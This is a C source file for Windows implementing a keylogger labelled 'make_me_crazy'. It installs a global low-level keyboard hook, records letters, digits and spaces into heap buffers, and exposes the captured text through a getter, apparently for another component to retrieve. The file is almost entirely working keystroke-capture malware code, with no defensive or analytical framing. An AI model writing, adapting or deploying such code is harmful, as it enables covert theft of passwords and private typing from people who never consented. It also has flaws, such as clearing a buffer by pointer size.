/*
 *
 */

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <winuser.h>
#include "UseTracker.h"

#define NAME "make_me_crazy"
#define maxLogSize 4096
#define buffSize 1024
#define buffLength 1
#define maximumValueName 16383

#define oneSecond 1000
#define oneMinute oneSecond * 60
#define timeout oneMinute

HHOOK ghHook = NULL; // NOTE - gh stands for global handle
HANDLE ghMutex = NULL;

HANDLE ghLogHeap = NULL;
PSTR pLogBuff = NULL; // pointer to a string, in this case, the key logger buffer
DWORD dwLogBuffSize = 0; // double word  - 32 bit unsigned integer, to hold size of key log buffer
DWORD dwLogBuffLength = 0;

HANDLE ghTempHeap = NULL;
PSTR pTempBuff = NULL;

HANDLE hTempBuffHasData = NULL;
HANDLE hTempBuffNoData = NULL;


/* STARTUP FUNCTION
 * called by Shell function, defines variables & starts new thread for keylogging functions
 */
int make_me_crazy()
{

	// Check to see if keylogger already running, if it is, return an error value
	if((ghMutex = CreateMutex(NULL, TRUE, NAME)) == NULL)
	{
		return(-1);
	} 

	// automatically clean up memory at program termination
	atexit((VOID *)clean);
	
	// allocate a heap for the 
	ghLogHeap = HeapCreate(0, buffSize + 1, 0);
	pLogBuff = (PSTR)HeapAlloc(ghLogHeap, HEAP_ZERO_MEMORY, buffSize + 1);
	dwLogBuffSize = buffSize + 1;

	ghTempHeap = HeapCreate(0, dwLogBuffSize, 0);
	pTempBuff = (PSTR)HeapAlloc(ghTempHeap, HEAP_ZERO_MEMORY, dwLogBuffSize);

	hTempBuffHasData = CreateEvent(NULL, TRUE, FALSE, NULL);
	hTempBuffNoData = CreateEvent(NULL, TRUE, TRUE, NULL);

	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)eventsRec, NULL, 0, NULL) == NULL) 
	{
		return(-1);
	}

	return(0);
}


/* KEYLOG FUNCTION
 * record keystrokes when they happen, change event states to indicate new key presses
 */
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (HC_ACTION == nCode)
	{
		KBDLLHOOKSTRUCT *keyEvent = (KBDLLHOOKSTRUCT *)lParam;
		if (WM_KEYDOWN == wParam)
		{
			dwLogBuffLength = strlen(pLogBuff);

			char key[2];
			DWORD keyCode = keyEvent->vkCode;

			if (keyCode >= 0x30 && keyCode <= 0x39)
			{
				sprintf(key, "%c", keyCode);
				Log(*key);
			} 
			else if (keyCode >= 0x41 && keyCode <= 0x5A)
			{
				sprintf(key, "%c", keyCode);
				Log(*key);
			}
			else
			{
				switch(keyCode)
				{
					case VK_SPACE:
						Log(' ');
						break;
				}
			}

			if (dwLogBuffLength == maxLogSize - 1)
			{
				WaitForSingleObject(hTempBuffNoData, INFINITE);
			}
			else if (WaitForSingleObject(hTempBuffNoData, 0) == WAIT_TIMEOUT)
			{
				return CallNextHookEx(0, nCode, wParam, lParam);
			}

	
			if(WaitForSingleObject(hTempBuffNoData, 0) == WAIT_OBJECT_0)
			{
				ZeroMemory(pTempBuff, sizeof(pTempBuff));
				strncpy(pTempBuff, pLogBuff, strlen(pLogBuff));
				ResetEvent(hTempBuffNoData);
			}
			else
			{
				strncpy(pTempBuff + strlen(pTempBuff), pLogBuff, strlen(pLogBuff));
			}

			SetEvent(hTempBuffHasData);

			ZeroMemory(pLogBuff, dwLogBuffSize);
		}
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}


/** INSTALLS A HOOK PROCEDURE INTO A HOOK CHAIN - MONITORS CERTAIN THREADS FOR EVENTS
 * Type of hook procedure - monitoring low-level keyboard input
 * Pointer to hook procedure - points to a DLL procedure OR a hook procedure in process code
 * handle to DLL containing hook procedure pointed to by previous param OR NULL if thread is created by current process
 * thread identifier - if 0, associated with all existing threads
 * Returns: HHOOK (handle to hook procedure)
**/
void eventsRec()
{
	if ((ghHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0)) == NULL)
	{
		ExitProcess(1);
	}

	MSG msg;

	while (GetMessage(&msg, 0, 0, 0) !=  0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(ghHook);

}

PSTR getBuff()
{
	return pTempBuff;
}

void Log(char character)
{
	sprintf(pLogBuff + strlen(pLogBuff), "%c", character);
	dwLogBuffLength = strlen(pLogBuff);
}

void clean()
{
	if (pLogBuff && ghLogHeap)
	{
		HeapFree(ghLogHeap, 0, pLogBuff);
		HeapDestroy(ghLogHeap);
	}
	if (ghHook) UnhookWindowsHookEx(ghHook);
	if (ghMutex) CloseHandle(ghMutex);
	if (pTempBuff && ghTempHeap)
	{
		HeapFree(ghTempHeap, 0, pTempBuff);
		HeapDestroy(ghTempHeap);
	}
}
